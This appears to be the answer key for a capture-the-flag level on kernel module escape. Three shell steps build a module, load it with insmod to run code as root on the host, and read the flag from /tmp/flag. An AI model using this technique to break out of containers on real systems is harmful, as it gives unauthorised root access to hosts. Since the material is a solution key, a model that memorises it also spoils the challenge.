SOLUTION — Level 5: Kernel Module Escape

# Build the module against the host kernel headers
cd /root/module
make

# Load the module — executes call_usermodehelper as root on the host
insmod escape.ko

# The module writes the flag to /tmp/flag
cat /tmp/flag
